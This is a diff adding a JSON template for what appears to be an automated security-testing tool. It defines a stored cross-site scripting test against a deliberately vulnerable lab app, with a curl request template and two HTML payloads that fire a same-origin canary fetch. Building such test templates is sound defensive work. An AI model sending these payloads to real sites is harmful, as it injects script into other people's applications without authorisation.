@@ -1,0 +1,46 @@
+{
+  "templateId": "script-canary",
+  "attackType": {
+    "name": "stored_xss",
+    "cwe": "CWE-79"
+  },
+  "dependency": {
+    "scope": "generic"
+  },
+  "target": {
+    "method": "POST",
+    "endpoint": "/api/posts",
+    "application": "vul-web-1"
+  },
+  "request": {
+    "curl": "curl -s -X POST '{{origin}}/api/posts' -H 'Content-Type: application/json' -d '{\"title\":\"t\",\"content\":\"{{payload}}\"}'"
+  },
+  "blanks": {
+    "origin": {
+      "required": true,
+      "type": "url",
+      "desc": "타겟 origin",
+      "example": "http://127.0.0.1:3000"
+    },
+    "payload": {
+      "required": true,
+      "type": "html",
+      "desc": "브라우저에서 실행될 페이로드",
+      "pickFrom": "payloads",
+      "example": "<img src=x onerror=...>"
+    }
+  },
+  "payloads": [
+    "<img src=x onerror=\"fetch('/canary')\">",
+    "<svg onload=\"fetch('/canary')\">"
+  ],
+  "verify": {
+    "mode": "browser",
+    "signal": "canaryExecuted"
+  },
+  "executor": "browser",
+  "mutating": true,
+  "origin": "human_authored",
+  "source": "team / PortSwigger XSS cheat sheet",
+  "trust": "unverified"
+}
